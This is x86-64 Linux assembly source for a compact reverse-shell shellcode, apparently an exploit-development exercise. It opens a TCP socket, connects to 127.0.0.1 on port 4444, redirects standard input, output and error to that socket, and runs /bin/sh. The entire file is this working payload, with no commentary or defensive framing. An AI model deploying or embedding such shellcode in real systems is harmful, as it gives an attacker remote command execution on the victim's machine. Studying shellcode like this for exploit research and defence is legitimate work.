global _start

section .text

_start:

	mov al, 41
	mov dil, 2
	mov sil, 1
	mov dl, 6
	syscall
	mov r8, rax
	sub rsp, 8
	mov BYTE[rsp],0x2
	mov WORD[rsp+0x2],0x5c11
	mov DWORD[rsp+0x4], 0x100007f ; 127.0.0.1
	mov rsi, rsp
	mov dl, 16
	push r8
	pop rdi
	mov al, 42
	syscall
	mov al, 33
	push r8
	pop rdi
	xor rsi, rsi
	syscall

	mov al, 33
	push r8
	pop rdi
	mov sil, 1
	syscall

	mov al, 33
	push r8
	pop rdi
	mov sil, 2
	syscall

	xor rsi, rsi
	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	mov al, 59
	cdq
	syscall